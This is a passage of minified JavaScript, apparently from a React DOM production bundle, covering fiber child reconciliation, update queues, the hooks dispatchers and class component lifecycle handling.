x=h(a,m,v.value,c);if(null===x){null===m&&(m=y);break}e&&m&&null===x.alternate&&t(a,m),o=s(x,o,g),null===d?u=x:d.sibling=x,d=x,m=y}if(v.done)return n(a,m),ai&&Ja(a,g),u;if(null===m){for(;!v.done;g++,v=l.next())null!==(v=p(a,v.value,c))&&(o=s(v,o,g),null===d?u=v:d.sibling=v,d=v);return ai&&Ja(a,g),u}for(m=r(a,m);!v.done;g++,v=l.next())null!==(v=f(m,a,g,v.value,c))&&(e&&null!==v.alternate&&m.delete(null===v.key?g:v.key),o=s(v,o,g),null===d?u=v:d.sibling=v,d=v);return e&&m.forEach(function(e){return t(a,e)}),ai&&Ja(a,g),u}return function e(r,i,s,l){if("object"===typeof s&&null!==s&&s.type===j&&null===s.key&&(s=s.props.children),"object"===typeof s&&null!==s){switch(s.$$typeof){case w:e:{for(var c=s.key,u=i;null!==u;){if(u.key===c){if((c=s.type)===j){if(7===u.tag){n(r,u.sibling),(i=a(u,s.props.children)).return=r,r=i;break e}}else if(u.elementType===c||"object"===typeof c&&null!==c&&c.$$typeof===L&&vi(c)===u.type){n(r,u.sibling),(i=a(u,s.props)).ref=gi(r,u,s),i.return=r,r=i;break e}n(r,u);break}t(r,u),u=u.sibling}s.type===j?((i=Oc(s.props.children,r.mode,l,s.key)).return=r,r=i):((l=Rc(s.type,s.key,s.props,null,r.mode,l)).ref=gi(r,i,s),l.return=r,r=l)}return o(r);case k:e:{for(u=s.key;null!==i;){if(i.key===u){if(4===i.tag&&i.stateNode.containerInfo===s.containerInfo&&i.stateNode.implementation===s.implementation){n(r,i.sibling),(i=a(i,s.children||[])).return=r,r=i;break e}n(r,i);break}t(r,i),i=i.sibling}(i=Mc(s,r.mode,l)).return=r,r=i}return o(r);case L:return e(r,i,(u=s._init)(s._payload),l)}if(te(s))return m(r,i,s,l);if(F(s))return g(r,i,s,l);yi(r,s)}return"string"===typeof s&&""!==s||"number"===typeof s?(s=""+s,null!==i&&6===i.tag?(n(r,i.sibling),(i=a(i,s)).return=r,r=i):(n(r,i),(i=Ic(s,r.mode,l)).return=r,r=i),o(r)):n(r,i)}}var bi=xi(!0),wi=xi(!1),ki=Na(null),ji=null,Ni=null,Si=null;function Ci(){Si=Ni=ji=null}function Ai(e){var t=ki.current;Sa(ki),e._currentValue=t}function Pi(e,t,n){for(;null!==e;){var r=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,null!==r&&(r.childLanes|=t)):null!==r&&(r.childLanes&t)!==t&&(r.childLanes|=t),e===n)break;e=e.return}}function Ti(e,t){ji=e,Si=Ni=null,null!==(e=e.dependencies)&&null!==e.firstContext&&(0!==(e.lanes&t)&&(xo=!0),e.firstContext=null)}function qi(e){var t=e._currentValue;if(Si!==e)if(e={context:e,memoizedValue:t,next:null},null===Ni){if(null===ji)throw Error(i(308));Ni=e,ji.dependencies={lanes:0,firstContext:e}}else Ni=Ni.next=e;return t}var Ei=null;function Li(e){null===Ei?Ei=[e]:Ei.push(e)}function Ri(e,t,n,r){var a=t.interleaved;return null===a?(n.next=n,Li(t)):(n.next=a.next,a.next=n),t.interleaved=n,Oi(e,r)}function Oi(e,t){e.lanes|=t;var n=e.alternate;for(null!==n&&(n.lanes|=t),n=e,e=e.return;null!==e;)e.childLanes|=t,null!==(n=e.alternate)&&(n.childLanes|=t),n=e,e=e.return;return 3===n.tag?n.stateNode:null}var Fi=!1;function Ii(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Mi(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Di(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function _i(e,t,n){var r=e.updateQueue;if(null===r)return null;if(r=r.shared,0!==(2&Al)){var a=r.pending;return null===a?t.next=t:(t.next=a.next,a.next=t),r.pending=t,Oi(e,n)}return null===(a=r.interleaved)?(t.next=t,Li(r)):(t.next=a.next,a.next=t),r.interleaved=t,Oi(e,n)}function Bi(e,t,n){if(null!==(t=t.updateQueue)&&(t=t.shared,0!==(4194240&n))){var r=t.lanes;n|=r&=e.pendingLanes,t.lanes=n,vt(e,n)}}function zi(e,t){var n=e.updateQueue,r=e.alternate;if(null!==r&&n===(r=r.updateQueue)){var a=null,i=null;if(null!==(n=n.firstBaseUpdate)){do{var s={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};null===i?a=i=s:i=i.next=s,n=n.next}while(null!==n);null===i?a=i=t:i=i.next=t}else a=i=t;return n={baseState:r.baseState,firstBaseUpdate:a,lastBaseUpdate:i,shared:r.shared,effects:r.effects},void(e.updateQueue=n)}null===(e=n.lastBaseUpdate)?n.firstBaseUpdate=t:e.next=t,n.lastBaseUpdate=t}function Wi(e,t,n,r){var a=e.updateQueue;Fi=!1;var i=a.firstBaseUpdate,s=a.lastBaseUpdate,o=a.shared.pending;if(null!==o){a.shared.pending=null;var l=o,c=l.next;l.next=null,null===s?i=c:s.next=c,s=l;var u=e.alternate;null!==u&&((o=(u=u.updateQueue).lastBaseUpdate)!==s&&(null===o?u.firstBaseUpdate=c:o.next=c,u.lastBaseUpdate=l))}if(null!==i){var d=a.baseState;for(s=0,u=c=l=null,o=i;;){var p=o.lane,h=o.eventTime;if((r&p)===p){null!==u&&(u=u.next={eventTime:h,lane:0,tag:o.tag,payload:o.payload,callback:o.callback,next:null});e:{var f=e,m=o;switch(p=t,h=n,m.tag){case 1:if("function"===typeof(f=m.payload)){d=f.call(h,d,p);break e}d=f;break e;case 3:f.flags=-65537&f.flags|128;case 0:if(null===(p="function"===typeof(f=m.payload)?f.call(h,d,p):f)||void 0===p)break e;d=M({},d,p);break e;case 2:Fi=!0}}null!==o.callback&&0!==o.lane&&(e.flags|=64,null===(p=a.effects)?a.effects=[o]:p.push(o))}else h={eventTime:h,lane:p,tag:o.tag,payload:o.payload,callback:o.callback,next:null},null===u?(c=u=h,l=d):u=u.next=h,s|=p;if(null===(o=o.next)){if(null===(o=a.shared.pending))break;o=(p=o).next,p.next=null,a.lastBaseUpdate=p,a.shared.pending=null}}if(null===u&&(l=d),a.baseState=l,a.firstBaseUpdate=c,a.lastBaseUpdate=u,null!==(t=a.shared.interleaved)){a=t;do{s|=a.lane,a=a.next}while(a!==t)}else null===i&&(a.shared.lanes=0);Fl|=s,e.lanes=s,e.memoizedState=d}}function Hi(e,t,n){if(e=t.effects,t.effects=null,null!==e)for(t=0;t<e.length;t++){var r=e[t],a=r.callback;if(null!==a){if(r.callback=null,r=n,"function"!==typeof a)throw Error(i(191,a));a.call(r)}}}var Ui={},Vi=Na(Ui),$i=Na(Ui),Gi=Na(Ui);function Qi(e){if(e===Ui)throw Error(i(174));return e}function Ki(e,t){switch(Ca(Gi,t),Ca($i,e),Ca(Vi,Ui),e=t.nodeType){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:le(null,"");break;default:t=le(t=(e=8===e?t.parentNode:t).namespaceURI||null,e=e.tagName)}Sa(Vi),Ca(Vi,t)}function Yi(){Sa(Vi),Sa($i),Sa(Gi)}function Xi(e){Qi(Gi.current);var t=Qi(Vi.current),n=le(t,e.type);t!==n&&(Ca($i,e),Ca(Vi,n))}function Ji(e){$i.current===e&&(Sa(Vi),Sa($i))}var Zi=Na(0);function es(e){for(var t=e;null!==t;){if(13===t.tag){var n=t.memoizedState;if(null!==n&&(null===(n=n.dehydrated)||"$?"===n.data||"$!"===n.data))return t}else if(19===t.tag&&void 0!==t.memoizedProps.revealOrder){if(0!==(128&t.flags))return t}else if(null!==t.child){t.child.return=t,t=t.child;continue}if(t===e)break;for(;null===t.sibling;){if(null===t.return||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var ts=[];function ns(){for(var e=0;e<ts.length;e++)ts[e]._workInProgressVersionPrimary=null;ts.length=0}var rs=b.ReactCurrentDispatcher,as=b.ReactCurrentBatchConfig,is=0,ss=null,os=null,ls=null,cs=!1,us=!1,ds=0,ps=0;function hs(){throw Error(i(321))}function fs(e,t){if(null===t)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!or(e[n],t[n]))return!1;return!0}function ms(e,t,n,r,a,s){if(is=s,ss=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,rs.current=null===e||null===e.memoizedState?Js:Zs,e=n(r,a),us){s=0;do{if(us=!1,ds=0,25<=s)throw Error(i(301));s+=1,ls=os=null,t.updateQueue=null,rs.current=eo,e=n(r,a)}while(us)}if(rs.current=Xs,t=null!==os&&null!==os.next,is=0,ls=os=ss=null,cs=!1,t)throw Error(i(300));return e}function gs(){var e=0!==ds;return ds=0,e}function ys(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return null===ls?ss.memoizedState=ls=e:ls=ls.next=e,ls}function vs(){if(null===os){var e=ss.alternate;e=null!==e?e.memoizedState:null}else e=os.next;var t=null===ls?ss.memoizedState:ls.next;if(null!==t)ls=t,os=e;else{if(null===e)throw Error(i(310));e={memoizedState:(os=e).memoizedState,baseState:os.baseState,baseQueue:os.baseQueue,queue:os.queue,next:null},null===ls?ss.memoizedState=ls=e:ls=ls.next=e}return ls}function xs(e,t){return"function"===typeof t?t(e):t}function bs(e){var t=vs(),n=t.queue;if(null===n)throw Error(i(311));n.lastRenderedReducer=e;var r=os,a=r.baseQueue,s=n.pending;if(null!==s){if(null!==a){var o=a.next;a.next=s.next,s.next=o}r.baseQueue=a=s,n.pending=null}if(null!==a){s=a.next,r=r.baseState;var l=o=null,c=null,u=s;do{var d=u.lane;if((is&d)===d)null!==c&&(c=c.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),r=u.hasEagerState?u.eagerState:e(r,u.action);else{var p={lane:d,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};null===c?(l=c=p,o=r):c=c.next=p,ss.lanes|=d,Fl|=d}u=u.next}while(null!==u&&u!==s);null===c?o=r:c.next=l,or(r,t.memoizedState)||(xo=!0),t.memoizedState=r,t.baseState=o,t.baseQueue=c,n.lastRenderedState=r}if(null!==(e=n.interleaved)){a=e;do{s=a.lane,ss.lanes|=s,Fl|=s,a=a.next}while(a!==e)}else null===a&&(n.lanes=0);return[t.memoizedState,n.dispatch]}function ws(e){var t=vs(),n=t.queue;if(null===n)throw Error(i(311));n.lastRenderedReducer=e;var r=n.dispatch,a=n.pending,s=t.memoizedState;if(null!==a){n.pending=null;var o=a=a.next;do{s=e(s,o.action),o=o.next}while(o!==a);or(s,t.memoizedState)||(xo=!0),t.memoizedState=s,null===t.baseQueue&&(t.baseState=s),n.lastRenderedState=s}return[s,r]}function ks(){}function js(e,t){var n=ss,r=vs(),a=t(),s=!or(r.memoizedState,a);if(s&&(r.memoizedState=a,xo=!0),r=r.queue,Fs(Cs.bind(null,n,r,e),[e]),r.getSnapshot!==t||s||null!==ls&&1&ls.memoizedState.tag){if(n.flags|=2048,qs(9,Ss.bind(null,n,r,a,t),void 0,null),null===Pl)throw Error(i(349));0!==(30&is)||Ns(n,t,a)}return a}function Ns(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},null===(t=ss.updateQueue)?(t={lastEffect:null,stores:null},ss.updateQueue=t,t.stores=[e]):null===(n=t.stores)?t.stores=[e]:n.push(e)}function Ss(e,t,n,r){t.value=n,t.getSnapshot=r,As(t)&&Ps(e)}function Cs(e,t,n){return n(function(){As(t)&&Ps(e)})}function As(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!or(e,n)}catch(r){return!0}}function Ps(e){var t=Oi(e,1);null!==t&&tc(t,e,1,-1)}function Ts(e){var t=ys();return"function"===typeof e&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:xs,lastRenderedState:e},t.queue=e,e=e.dispatch=Gs.bind(null,ss,e),[t.memoizedState,e]}function qs(e,t,n,r){return e={tag:e,create:t,destroy:n,deps:r,next:null},null===(t=ss.updateQueue)?(t={lastEffect:null,stores:null},ss.updateQueue=t,t.lastEffect=e.next=e):null===(n=t.lastEffect)?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e),e}function Es(){return vs().memoizedState}function Ls(e,t,n,r){var a=ys();ss.flags|=e,a.memoizedState=qs(1|t,n,void 0,void 0===r?null:r)}function Rs(e,t,n,r){var a=vs();r=void 0===r?null:r;var i=void 0;if(null!==os){var s=os.memoizedState;if(i=s.destroy,null!==r&&fs(r,s.deps))return void(a.memoizedState=qs(t,n,i,r))}ss.flags|=e,a.memoizedState=qs(1|t,n,i,r)}function Os(e,t){return Ls(8390656,8,e,t)}function Fs(e,t){return Rs(2048,8,e,t)}function Is(e,t){return Rs(4,2,e,t)}function Ms(e,t){return Rs(4,4,e,t)}function Ds(e,t){return"function"===typeof t?(e=e(),t(e),function(){t(null)}):null!==t&&void 0!==t?(e=e(),t.current=e,function(){t.current=null}):void 0}function _s(e,t,n){return n=null!==n&&void 0!==n?n.concat([e]):null,Rs(4,4,Ds.bind(null,t,e),n)}function Bs(){}function zs(e,t){var n=vs();t=void 0===t?null:t;var r=n.memoizedState;return null!==r&&null!==t&&fs(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function Ws(e,t){var n=vs();t=void 0===t?null:t;var r=n.memoizedState;return null!==r&&null!==t&&fs(t,r[1])?r[0]:(e=e(),n.memoizedState=[e,t],e)}function Hs(e,t,n){return 0===(21&is)?(e.baseState&&(e.baseState=!1,xo=!0),e.memoizedState=n):(or(n,t)||(n=mt(),ss.lanes|=n,Fl|=n,e.baseState=!0),t)}function Us(e,t){var n=xt;xt=0!==n&&4>n?n:4,e(!0);var r=as.transition;as.transition={};try{e(!1),t()}finally{xt=n,as.transition=r}}function Vs(){return vs().memoizedState}function $s(e,t,n){var r=ec(e);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},Qs(e))Ks(t,n);else if(null!==(n=Ri(e,t,n,r))){tc(n,e,r,Zl()),Ys(n,t,r)}}function Gs(e,t,n){var r=ec(e),a={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(Qs(e))Ks(t,a);else{var i=e.alternate;if(0===e.lanes&&(null===i||0===i.lanes)&&null!==(i=t.lastRenderedReducer))try{var s=t.lastRenderedState,o=i(s,n);if(a.hasEagerState=!0,a.eagerState=o,or(o,s)){var l=t.interleaved;return null===l?(a.next=a,Li(t)):(a.next=l.next,l.next=a),void(t.interleaved=a)}}catch(c){}null!==(n=Ri(e,t,a,r))&&(tc(n,e,r,a=Zl()),Ys(n,t,r))}}function Qs(e){var t=e.alternate;return e===ss||null!==t&&t===ss}function Ks(e,t){us=cs=!0;var n=e.pending;null===n?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function Ys(e,t,n){if(0!==(4194240&n)){var r=t.lanes;n|=r&=e.pendingLanes,t.lanes=n,vt(e,n)}}var Xs={readContext:qi,useCallback:hs,useContext:hs,useEffect:hs,useImperativeHandle:hs,useInsertionEffect:hs,useLayoutEffect:hs,useMemo:hs,useReducer:hs,useRef:hs,useState:hs,useDebugValue:hs,useDeferredValue:hs,useTransition:hs,useMutableSource:hs,useSyncExternalStore:hs,useId:hs,unstable_isNewReconciler:!1},Js={readContext:qi,useCallback:function(e,t){return ys().memoizedState=[e,void 0===t?null:t],e},useContext:qi,useEffect:Os,useImperativeHandle:function(e,t,n){return n=null!==n&&void 0!==n?n.concat([e]):null,Ls(4194308,4,Ds.bind(null,t,e),n)},useLayoutEffect:function(e,t){return Ls(4194308,4,e,t)},useInsertionEffect:function(e,t){return Ls(4,2,e,t)},useMemo:function(e,t){var n=ys();return t=void 0===t?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var r=ys();return t=void 0!==n?n(t):t,r.memoizedState=r.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},r.queue=e,e=e.dispatch=$s.bind(null,ss,e),[r.memoizedState,e]},useRef:function(e){return e={current:e},ys().memoizedState=e},useState:Ts,useDebugValue:Bs,useDeferredValue:function(e){return ys().memoizedState=e},useTransition:function(){var e=Ts(!1),t=e[0];return e=Us.bind(null,e[1]),ys().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,n){var r=ss,a=ys();if(ai){if(void 0===n)throw Error(i(407));n=n()}else{if(n=t(),null===Pl)throw Error(i(349));0!==(30&is)||Ns(r,t,n)}a.memoizedState=n;var s={value:n,getSnapshot:t};return a.queue=s,Os(Cs.bind(null,r,s,e),[e]),r.flags|=2048,qs(9,Ss.bind(null,r,s,n,t),void 0,null),n},useId:function(){var e=ys(),t=Pl.identifierPrefix;if(ai){var n=Xa;t=":"+t+"R"+(n=(Ya&~(1<<32-st(Ya)-1)).toString(32)+n),0<(n=ds++)&&(t+="H"+n.toString(32)),t+=":"}else t=":"+t+"r"+(n=ps++).toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},Zs={readContext:qi,useCallback:zs,useContext:qi,useEffect:Fs,useImperativeHandle:_s,useInsertionEffect:Is,useLayoutEffect:Ms,useMemo:Ws,useReducer:bs,useRef:Es,useState:function(){return bs(xs)},useDebugValue:Bs,useDeferredValue:function(e){return Hs(vs(),os.memoizedState,e)},useTransition:function(){return[bs(xs)[0],vs().memoizedState]},useMutableSource:ks,useSyncExternalStore:js,useId:Vs,unstable_isNewReconciler:!1},eo={readContext:qi,useCallback:zs,useContext:qi,useEffect:Fs,useImperativeHandle:_s,useInsertionEffect:Is,useLayoutEffect:Ms,useMemo:Ws,useReducer:ws,useRef:Es,useState:function(){return ws(xs)},useDebugValue:Bs,useDeferredValue:function(e){var t=vs();return null===os?t.memoizedState=e:Hs(t,os.memoizedState,e)},useTransition:function(){return[ws(xs)[0],vs().memoizedState]},useMutableSource:ks,useSyncExternalStore:js,useId:Vs,unstable_isNewReconciler:!1};function to(e,t){if(e&&e.defaultProps){for(var n in t=M({},t),e=e.defaultProps)void 0===t[n]&&(t[n]=e[n]);return t}return t}function no(e,t,n,r){n=null===(n=n(r,t=e.memoizedState))||void 0===n?t:M({},t,n),e.memoizedState=n,0===e.lanes&&(e.updateQueue.baseState=n)}var ro={isMounted:function(e){return!!(e=e._reactInternals)&&We(e)===e},enqueueSetState:function(e,t,n){e=e._reactInternals;var r=Zl(),a=ec(e),i=Di(r,a);i.payload=t,void 0!==n&&null!==n&&(i.callback=n),null!==(t=_i(e,i,a))&&(tc(t,e,a,r),Bi(t,e,a))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var r=Zl(),a=ec(e),i=Di(r,a);i.tag=1,i.payload=t,void 0!==n&&null!==n&&(i.callback=n),null!==(t=_i(e,i,a))&&(tc(t,e,a,r),Bi(t,e,a))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=Zl(),r=ec(e),a=Di(n,r);a.tag=2,void 0!==t&&null!==t&&(a.callback=t),null!==(t=_i(e,a,r))&&(tc(t,e,r,n),Bi(t,e,r))}};function ao(e,t,n,r,a,i,s){return"function"===typeof(e=e.stateNode).shouldComponentUpdate?e.shouldComponentUpdate(r,i,s):!t.prototype||!t.prototype.isPureReactComponent||(!lr(n,r)||!lr(a,i))}function io(e,t,n){var r=!1,a=Aa,i=t.contextType;return"object"===typeof i&&null!==i?i=qi(i):(a=La(t)?qa:Pa.current,i=(r=null!==(r=t.contextTypes)&&void 0!==r)?Ea(e,a):Aa),t=new t(n,i),e.memoizedState=null!==t.state&&void 0!==t.state?t.state:null,t.updater=ro,e.stateNode=t,t._reactInternals=e,r&&((e=e.stateNode).__reactInternalMemoizedUnmaskedChildContext=a,e.__reactInternalMemoizedMaskedChildContext=i),t}function so(e,t,n,r){e=t.state,"function"===typeof t.componentWillReceiveProps&&t.componentWillReceiveProps(n,r),"function"===typeof t.UNSAFE_componentWillReceiveProps&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&ro.enqueueReplaceState(t,t.state,null)}function oo(e,t,n,r){var a=e.stateNode;a.props=n,a.state=e.memoizedState,a.refs={},Ii(e);var i=t.contextType;"object"===typeof i&&null!==i?a.context=qi(i):(i=La(t)?qa:Pa.current,a.context=Ea(e,i)),a.state=e.memoizedState,"function"===typeof(i=t.getDerivedStateFromProps)&&(no(e,t,i,n),a.state=e.memoizedState),"function"===typeof t.getDerivedStateFromProps||"function"===typeof a.getSnapshotBeforeUpdate||"function"!==typeof a.UNSAFE_componentWillMount&&"function"!==typeof a.componentWillMount||(t=a.state,"function"===typeof a.componentWillMount&&a.componentWillMount(),"function"===typeof a.UNSAFE_componentWillMount&&a.UNSAFE_componentWillMount(),t!==a.state&&ro.enqueueReplaceState(a,a.state,null),Wi(e,n,a,r),a.state=e.memoizedState),"function"===typeof a.componentDidMount&&(e.flags|=4194308)}function lo(e,t){try{var n="",r=t;do{n+=z(r),r=r.return}while(r);var a=n}catch(i){a="\nError generating stack: "+i.message+"\n"+i.stack}return{value:e,source:t,stack:a,digest:null}}function co(e,t,n){return{value:e,source:null,stack:null!=n?n:null,digest:null!=t?t:null}}function uo(e,t){try{console.error(t.value)}catch(n){setTimeout(function(){throw n})}}var po="function"===typeof WeakMap?WeakMap:Map;function ho(e,t,n){(n=Di(-1,n)).tag=3,n.payload={element:null};var r=t.value;return n.callback=function(){Hl||(Hl=!0,Ul=r),uo(0,t)},n}function fo(e,t,n){(n=Di(-1,n)).tag=3;var r=e.type.getDerivedStateFromError;if("function"===typeof r){var a=t.value;n.payload=function(){return r(a)},n.callback=function(){uo(0,t)}}var i=e.stateNode;return null!==i&&"function"===typeof i.componentDidCatch&&(n.callback=function(){uo(0,t),"function"!==typeof r&&(null===Vl?Vl=new Set([this]):Vl.add(this));var e=t.stack;this.componentDidCatch(t.value,{componentStack:null!==e?e:""})}),n}function mo(e,t,n){var r=e.pingCache;if(null===r){r=e.pingCache=new po;var a=new Set;r.set(t,a)}else void 0===(a=r.get(t))&&(a=new Set,r.set(t,a));a.has(n)||(a.add(n),e=Nc.bind(null,e,t,n),t.then(e,e))}function go(e){do{var t;if((t=13===e.tag)&&(t=null===(t=e.memoizedState)||null!==t.dehydrated),t)return e;e=e.return}while(null!==e);return null}function yo(e,t,n,r,a){return 0===(1&e.mode)?(e===t?e.flags|=65536:(e.flags|=128,n.flags|=131072,n.flags&=-52805,1===n.tag&&(null===n.alternate?n.tag=17:((t=Di(-1,1)).tag=2,_i(n,t,1))),n.lanes|=1),e):(e.flags|=65536,e.lanes=a,e)}var vo=b.ReactCurrentOwner,xo=!1;function bo(e,t,n,r){t.child=null===e?wi(t,null,n,r):bi(t,e.child,n,r)}function wo(e,t,n,r,a){n=n.render;var i=t.ref;return Ti(t,a),r=ms(e,t,n,r,i,a),n=gs(),null===e||xo?(ai&&n&&ei(t),t.flags|=1,bo(e,t,r,a),t.child):(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a,Ho(e,t,a))}function ko(e,t,n,r,a){if(null===e){var i=n.type;return"function"!==typeof i||Ec(i)||void 0!==i.defaultProps||null!==n.compare||void 0!==n.defaultProps?((e=Rc(n.type,null,r,t,t.mode,a)).ref=t.ref,e.return=t,t.child=e):(t.tag=15,t.type=i,jo(e,t,i,r,a))}if(i=e.child,0===(e.lanes&a)){var s=i.memoizedProps;if((n=null!==(n=n.compare)?n:lr)(s,r)&&e.ref===t.ref)return Ho(e,t,a)}return t.flags|=1,(e=Lc(i,r)).ref=t.ref,e.return=t,t.child=e}function jo(e,t,n,r,a){if(null!==e){var i=e.memoizedProps;if(lr(i,r)&&e.ref===t.ref){if(xo=!1,t.pendingProps=r=i,0===(e.lanes&a))return t.lanes=e.lanes,Ho(e,t,a);0!==(131072&e.flags)&&(xo=!0)}}return Co(e,t,n,r,a)}function No(e,t,n){var r=t.pendingProps,a=r.children,i=null!==e?e.memoizedState:null;if("hidden"===r.mode)if(0===(1&t.mode))t.memoizedState={baseLanes:0,cachePool:null,transitions:null},Ca(Ll,El),El|=n;else{if(0===(1073741824&n))return e=null!==i?i.baseLanes|n:n,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,Ca(Ll,El),El|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=null!==i?i.baseLanes:n,Ca(Ll,El),El|=r}else null!==i?(r=i.baseLanes|n,t.memoizedState=null):r=n,Ca(Ll,El),El|=r;return bo(e,t,a,n),t.child}function So(e,t){var n=t.ref;(null===e&&null!==n||null!==e&&e.ref!==n)&&(t.flags|=512,t.flags|=2097152)}function Co(e,t,n,r,a){var i=La(n)?qa:Pa.current;return i=Ea(t,i),Ti(t,a),n=ms(e,t,n,r,i,a),r=gs(),null===e||xo?(ai&&r&&ei(t),t.flags|=1,bo(e,t,n,a),t.child):(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a,Ho(e,t,a))}function Ao(e,t,n,r,a){if(La(n)){var i=!0;Ia(t)}else i=!1;if(Ti(t,a),null===t.stateNode)Wo(e,t),io(t,n,r),oo(t,n,r,a),r=!0;else if(null===e){var s=t.stateNode,o=t.memoizedProps;s.props=o;var l=s.context,c=n.contextType;"object"===typeof c&&null!==c?c=qi(c):c=Ea(t,c=La(n)?qa:Pa.current);var u=n.getDerivedStateFromProps,d="function"===typeof u||"function"===typeof s.getSnapshotBeforeUpdate;d||"function"!==typeof s.UNSAFE_componentWillReceiveProps&&"function"!==typeof s.componentWillReceiveProps||(o!==r||l!==c)&&so(t,s,r,c),Fi=!1;var p=t.memoizedState;s.state=p,Wi(t,r,s,a),l=t.memoizedState,o!==r||p!==l||Ta.current||Fi?("function"===typeof u&&(no(t,n,u,r),l=t.memoizedState),(o=Fi||ao(t,n,o,r,p,l,c))?(d||"function"!==typeof s.UNSAFE_componentWillMount&&"function"!==typeof s.componentWillMount||("function"===typeof s.componentWillMount&&s.componentWillMount(),"function"===typeof s.UNSAFE_componentWillMount&&s.UNSAFE_componentWillMount()),"function"===typeof s.componentDidMount&&(t.flags|=4194308)):("function"===typeof s.componentDidMount&&(t.flags|=4194308),t.memoizedProps=r,t.memoizedState=l),s.props=r,s.state=l,s.context=c,r=o):("function"===typeof s.componentDidMount&&(t.flags|=4194308),r=!1)}else{s=t.stateNode,Mi(e,t),o=t.memoizedProps,c=t.type===t.elementType?o:to(t.type,o),s.props=c,d=t.pendingProps,p=s.context,"object"===typeof(l=n.contextType)&&null!==l?l=qi(l):l=Ea(t,l=La(n)?qa:Pa.current);var h=n.getDerivedStateFromProps;(u="function"===typeof h||"function"===typeof s.getSnapshotBeforeUpdate)||"function"!==typeof s.UNSAFE_componentWillReceiveProps&&"function"!==typeof s.componentWillReceiveProps||(o!==d||p!==l)&&so(t,s,r,l),Fi=!1,p=t.memoizedState,s.state=p,Wi(t,r,s,a);var f=t.memoizedState;o!==d||p!==f||Ta.current||Fi?("function"===typeof h&&(no(t,n,h,r),f=t.memoizedState),(c=Fi||ao(t,n,c,r,p,f,l)||!1)?(u||"function"!==typeof s.UNSAFE_componentWillUpdate&&"function"!==typeof s.componentWillUpdate||("function"===typeof s.componentWillUpdate&&s.componentWillUpdate(r,f,l),"function"===typeof s.UNSAFE_componentWillUpdate&&s.UNSAFE_componentWillUpdate(r,f,l)),"function"===typeof s.componentDidUpdate&&(t.flags|=4),"function"===typeof s.getSnapshotBeforeUpdate&&(t.flags|=1024)):("function"!==typeof s.componentDidUpdate||o===e.memoizedProps&&p===e.memoizedState||(t.flags|=4),"function"!==typeof s.getSnapshotBeforeUpdate||o===e.memoizedProps&&p===e.memoizedState||(t.flags|=1024),t.memoizedProps=r,t.memoizedState=f),s.props=r,s.state=f,s.context=l,r=c):("function"!==typeof s.componentDidUpdate||o===e.memoizedProps&&p===e.memoizedState||(t.flags|=4),"function"!==typeof s.getSnapshotBeforeUpdate||o===e.memoizedProps&&p===e.memoizedState||(t.flags|=1024),r=!1)}return Po(e,t,n,r,i,a)}function Po(e,t,n,r,a,i){So(e,t);var s=0!==(128&t.flags);if(!r&&!s)return a&&Ma(t,n,!1),Ho(e,t,i);r=t.stateNode,vo.current=t;var o=s&&"function"!==typeof n.getDerivedStateFromError?null:r.render();return t.flags|=1,null!==e&&s?(t.child=bi(t,e.child,null,i),t.child=bi(t,null,o,i)):bo(e,t,o,i),t.memoizedState=r.state,a&&Ma(t,n,!0),t.child}function To(e){var t=e.stateNode;t.pendingContext?Oa(0,t.pendingContext,t.pendingContext!==t.context):t.context&&Oa(0,t.context,!1),Ki(e,t.containerInfo)}function qo(e,t,n,r,a){return hi(),fi(a),t.flags|=256,bo(e,t,n,r),t.child}var Eo,Lo,Ro,Oo={dehydrated:null,treeContext:null,retryLane:0};function Fo(e){return{baseLanes:e,cachePool:null,transitions:null}}function Io(e,t,n){var r,a=t.pendingProps,s=Zi.current,o=!1,l=0!==(128&t.flags);if((r=l)||(r=(null===e||null!==e.memoizedState)&&0!==(2&s)),r?(o=!0,t.flags&=-129):null!==e&&null===e.memoizedState||(s|=1),Ca(Zi,1&s),null===e)return 